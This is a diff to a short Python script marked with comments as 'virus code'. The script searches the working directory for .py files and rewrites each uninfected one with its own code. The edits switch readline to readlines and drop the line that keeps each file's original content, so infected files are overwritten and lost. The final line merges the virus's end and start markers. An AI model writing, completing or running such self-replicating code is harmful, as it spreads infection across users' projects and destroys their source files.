@@ -1,4 +1,3 @@
-print("Hello world")
 #start of virus code
 import glob,re,sys
 viruscode = []
@@ -33,7 +32,7 @@ files = glob.glob("*.py") #this will only search python files
 
 for f in files:   #for each file this will do bellow things
     file = open(f,"r")
-    filecode = file.readline()
+    filecode = file.readlines()
     file.close()
 
     infected = False
@@ -44,7 +43,7 @@ for f in files:   #for each file this will do bellow things
 
         if not infected:
             newCode = []
-            newCode.extend(filecode)
+            
             newCode.extend(viruscode)
             
             #now re-write the infected file with virus code and old code
@@ -61,4 +60,4 @@ for f in files:   #for each file this will do bellow things
 
 
 
-#end of virus code
+#end of virus code#start of virus code
